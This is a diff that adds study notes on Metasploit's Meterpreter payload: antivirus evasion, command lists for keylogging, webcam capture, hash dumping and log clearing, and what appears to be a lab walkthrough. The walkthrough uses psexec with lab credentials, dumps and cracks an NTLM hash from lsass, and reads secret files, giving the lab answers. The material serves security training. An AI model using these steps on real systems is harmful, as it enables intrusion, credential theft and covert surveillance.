@@ -1,1 +1,164 @@
+METERPRETER
+Metasploit's payload that will run on a target system and act as an agent within a command and control architecture.
+Runs on system, but is not installed on it. Runs in memory.
+
+Most antivrius software scan new files on disk, but Meterpreter will be seen as a process and not a file on the target system
+In Meterpreter we can run getpid to find out current process ID. For example. Current pid: 1304
+Using the ps command we see a list of processes running.
+We may see PID 1304 listed as spoolsv.exe and not Meterpreter.exe as one might expect.
+
+msfvenom --list payloads | grep meterpreter
+List will show Meterpreter versions for the following platforms:
+Android
+Apple iOS
+Java
+Linux
+OSX
+PHP
+Python
+Windows
+
+We will choose the version based on mostly 3 factors
+- The target operating system
+- Components on the target system (is Python installed? Is it a PHP website? etc.)
+- Network connection types we can have on the system (TCP allowed? Can we only have a https reverse connection? etc)
+
+Using "help" on a Meterpreter session will list all avaiable commands
+Every version of Meterpreter will have different command options. So it's good to run help to see what's available
+_________________________________________________________________________________________
+Below are some of the most commonly used commands.
+
+CORE COMMANDS
+background: Backgrounds the current session
+exit: Terminate the Meterpreter session
+guid: Get the session GUID (Globally Unique Identifier)
+help: Displays the help menu
+info: Displays information about a Post module
+irb: Opens an interactive Ruby shell on the current session
+load: Loads one or more Meterpreter extensions
+migrate: Allows you to migrate Meterpreter to another process
+run: Executes a Meterpreter script or Post module
+sessions: Quickly switch to another session
+
+FILE SYSTEM COMMANDS
+cd: Will change directory
+ls: Will list files in the current directory (dir will also work)
+pwd: Prints the current working directory
+edit: will allow you to edit a file
+cat: Will show the contents of a file to the screen
+rm: Will delete the specified file
+search: Will search for files
+upload: Will upload a file or directory
+download: Will download a file or directory
+
+NETWORKING COMMANDS
+arp: Displays the host ARP (Address Resolution Protocol) cache
+ifconfig: Displays network interfaces available on the target system
+netstat: Displays the network connections
+portfwd: Forwards a local port to a remote service
+route: Allows you to view and modify the routing table
+
+SYSTEM COMMANDS
+clearev: Clears the event logs
+execute: Executes a command
+getpid: Shows the current process identifier
+getuid: Shows the user that Meterpreter is running as
+kill: Terminates a process
+pkill: Terminates processes by name
+ps: Lists running processes
+reboot: Reboots the remote computer
+shell: Drops into a system command shell
+shutdown: Shuts down the remote computer
+sysinfo: Gets information about the remote system, such as OS
+
+OTHER COMMANDS (these will be listed under different menu categories in the help menu)
+idletime: Returns the number of seconds the remote user has been idle
+keyscan_dump: Dumps the keystroke buffer
+keyscan_start: Starts capturing keystrokes
+keyscan_stop: Stops capturing keystrokes
+screenshare: Allows you to watch the remote user's desktop in real time
+screenshot: Grabs a screenshot of the interactive desktop
+record_mic: Records audio from the default microphone for X seconds
+webcam_chat: Starts a video chat
+webcam_list: Lists webcams
+webcam_snap: Takes a snapshot from the specified webcam
+webcam_stream: Plays a video stream from the specified webcam
+getsystem: Attempts to elevate your privilege to that of local system
+hashdump: Dumps the contents of the SAM database
+
+Expanding on some commands:
+getuid - will display the user with which Meterpreter is running. May give you an idea of possible privilege level eg. NT AUTHORITY\SYSTEM
+migrate (PID) - allows you to migrate to processors running. Allowing Meterpreter to interact with it. For example, migrating to word or notepad file opened. Then using keyscan_start keyscan_stop keyscap_dump to capture keystrokes.
+hashdump - Lists content of the SAM database. Stored in NTLM format
+search -f *.txt - allows you to search for files that may contain juicy information
+shell - Launches a regular command line shell on target system. Ctrl+Z takes you back to Meterpreter shell
+
+_________________________________________________________________________________________
+
+POST-EXPLOITATION CHALLENGE
+I can use the credentials below to simulate an initial compromise over SMB (Server Message Block) (using exploit/windows/smb/psexec)
+Credentials
+Username: ballen
+Password: Password1
+
+msfconsole
+use exploit/windows/smb/psexec
+show options - We can see there is a SMBUser and SMBPass option
+setg rhosts 10.49.131.233
+set SMBUser ballen
+set SMBPass Password1
+run
+
+Q. What is the computer name?
+sysinfo
+A. ACME-TEST
+
+What is the target domain?
+A. FLASH
+
+Q. What is the name of the share likely created by the user?
+background
+use post/windows/gather/enum_shares
+show options - SESSION number required
+set SESSION 1
+run
+A. speedster
+
+
+Q. What is the NTLM hash of the jchambers user? Hint: you will have to migrate to lsass.exe
+ps
+migrate 772 (lsass.exe)
+hashdump
+jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
+NTLM Hash: 69596c7aa1e8daee17f8e78870e25a5c
+
+
+Q. What is the cleartext password of the jchambers user?
+A. Using crackstation.net
+Hash converts to: Trustno1
+
+
+Q. Where is the "secrets.txt"  file located? (Full path of the file)
+search -f secrets.txt
+A. c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
+
+
+Q. What is the Twitter password revealed in the "secrets.txt" file?
+shell
+type c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
+A. KDSvbsw3849!
+
+
+Q. Where is the "realsecret.txt" file located? (Full path of the file)
+Ctrl+Z (back to Meterpreter from shell)
+search -f realsecret.txt
+A. c:\inetpub\wwwroot\realsecret.txt
+
+Q. What is the real secret?
+shell
+type c:\inetpub\wwwroot\realsecret.txt
+A. The Flash is the fastest man alive
+
+
+
 
